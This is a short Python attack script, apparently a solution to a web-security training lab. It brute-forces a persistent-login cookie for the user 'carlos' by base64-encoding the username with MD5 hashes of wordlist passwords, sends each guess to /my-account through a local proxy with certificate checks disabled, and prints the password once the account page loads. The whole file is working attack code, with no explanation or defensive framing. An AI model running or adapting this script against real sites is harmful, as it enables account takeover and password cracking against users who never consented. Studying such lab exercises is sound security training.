import requests
import sys
import urllib3
import hashlib
import base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

password_list = r"C:\Users\acalarco\Desktop\p\ptest\wordlist\passwords.txt"


def tokenizer(password):
    username = 'carlos'
    md5_password = hashlib.md5(password.encode()).hexdigest()
    token = "{0}:{1}".format(username,md5_password)
    base64_token_encoded = base64.b64encode(bytes(token, 'utf-8'))
    base64_token = base64_token_encoded.decode('utf-8')
    return base64_token
    


def perform_request(url,password):
    uri = "/my-account"
    encoded_token = tokenizer(password)
    cookie = {'stay-logged-in' : encoded_token , 'session' : 'zVBThe6IyUWHU34vlLqm6n949MsxVUwT'}
    r = requests.get(url + uri, cookies=cookie, verify=False, proxies=proxies)
    return r


def password_enumerator(url,password_list):
    with open(password_list,'r') as p:
        passwords = p.readlines()
        for x in passwords:
            password = x.split("\n")[0]
            sys.stdout.write("[+] Testando la password %s\r" % password)
            sys.stdout.flush()
            response = perform_request(url,password)
            if "Your username is: carlos" in response.text:
                p.close()
                return password
            sys.stdout.write("\033[K")
        
        p.close()
        return False





if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Utilizzo: %s <url>" % sys.argv[0])
        print("[-] Esempio: %s www.example.com" % sys.argv[0])
        sys.exit()

    password = password_enumerator(url,password_list)
    if password:
        print("\n[+] La password è: %s" % password)
    else:
        print("[-] Password non individuata...")